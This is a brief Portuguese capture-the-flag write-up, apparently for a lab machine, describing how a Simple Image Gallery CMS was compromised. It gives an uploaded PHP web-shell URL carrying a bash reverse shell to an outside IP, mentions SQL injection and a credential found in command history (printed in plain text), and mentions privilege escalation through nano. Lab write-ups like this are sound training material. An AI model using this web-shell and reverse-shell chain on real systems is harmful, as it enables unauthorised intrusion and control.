Enumeração dos serviços:
![[Pasted image 20240126112654.png]]
Exploit do CMS Simple Image Gallery:
https://www.exploit-db.com/exploits/50214


http://10.10.224.196/gallery/uploads/1706483700_TagoxqanwzqgxdxrjciLetta.php?cmd=/bin/bash%20-c%20%27bash%20-i%20%3E%20/dev/tcp/10.9.58.140/443%200%3E%261%27

Hash do admin encontrado explorando SQLi no parâmetro id do menu de albuns do site.

Movimentação lateral com senha do usuário mike encontrado no histórico de comandos através do linpeas.

mike:b3stpassw0rdbr0xx

Escalação de privilégio através do nano, utilizado por um script com permissão root.


